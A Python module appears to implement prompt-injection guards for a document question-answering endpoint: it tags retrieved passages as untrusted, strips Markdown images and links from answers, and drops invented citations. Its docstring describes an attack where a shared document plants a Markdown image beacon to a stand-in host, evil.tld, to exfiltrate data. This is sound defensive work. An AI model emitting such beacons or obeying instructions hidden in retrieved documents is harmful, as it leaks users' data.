"""Prompt-injection guards for /ask (Ultra P0-3).

1. Retrieved passages are wrapped in <untrusted_passage> tags when passed
   to a model, so instructions inside a document are data, not system text.
2. Outbound Markdown images and links are stripped from answers, so a
   `![](https://evil.tld/log?...)` beacon in a shared doc cannot exfiltrate.
3. Citations are validated: every cited chunk id must be in the SQL result
   set for this user/transaction. A model-invented citation is dropped.
"""
import re

IMAGE_RE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
LINK_RE = re.compile(r"\[([^\]]*)\]\([^)]*\)")


def strip_markdown_images_and_links(text: str) -> str:
    text = IMAGE_RE.sub("[image removed]", text)
    text = LINK_RE.sub(r"\1", text)
    return text


def wrap_passages(passages: list[dict]) -> str:
    """Format retrieved passages for model context, clearly delimited."""
    parts = []
    for p in passages:
        parts.append(
            f"<untrusted_passage doc=\"{p['doc_title']}\" chunk_id=\"{p['chunk_id']}\">\n"
            f"{p['text']}\n</untrusted_passage>"
        )
    return "\n\n".join(parts)


def validate_citations(cited_ids: list, allowed_ids: list) -> list:
    allowed = set(str(x) for x in allowed_ids)
    return [c for c in cited_ids if str(c) in allowed]
